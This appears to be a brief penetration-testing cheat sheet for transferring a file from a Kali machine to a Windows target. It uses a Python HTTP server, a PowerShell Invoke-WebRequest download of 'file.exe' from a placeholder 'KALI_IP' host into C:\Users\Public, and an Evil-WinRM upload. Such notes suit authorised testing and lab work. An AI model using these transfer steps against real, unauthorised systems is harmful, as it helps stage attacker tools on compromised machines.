## 1. Kali — from the folder containing the file

**Kali**

```bash
python3 -m http.server 8000
```

Keep the server running; serve only the intended transfer folder.

## 2. Windows — save the file

**Windows PowerShell**

```powershell
Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\Users\Public\file.exe'
```

## Alternative — if already in Evil-WinRM

**Evil-WinRM prompt**

```bash
upload ./file.exe C:\Users\Public\file.exe
```
